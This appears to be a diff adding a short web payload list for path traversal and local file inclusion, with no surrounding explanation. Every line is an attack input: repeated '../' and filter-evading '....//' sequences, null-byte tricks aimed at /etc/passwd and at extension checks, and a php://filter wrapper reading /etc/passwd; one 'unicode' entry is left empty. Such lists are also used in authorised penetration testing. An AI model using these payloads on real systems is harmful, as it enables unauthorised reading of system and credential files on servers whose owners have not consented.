@@ -1,0 +1,14 @@
+?file=....//....//....//....//....//....//....//file
+
+?file=../../../../../../../../../../../../../file
+
+?file=....//....//....//....//file
+
+?file=....\/....\/....\/....\/file
+
+unicode 
+nullbyte betweene .%00./.%00./.%00./.%00./.%00./.%00./etc/passwd
+
+nullbyte extension /../../../file%00.jpg
+
+php://filter/resource=/etc/passwd
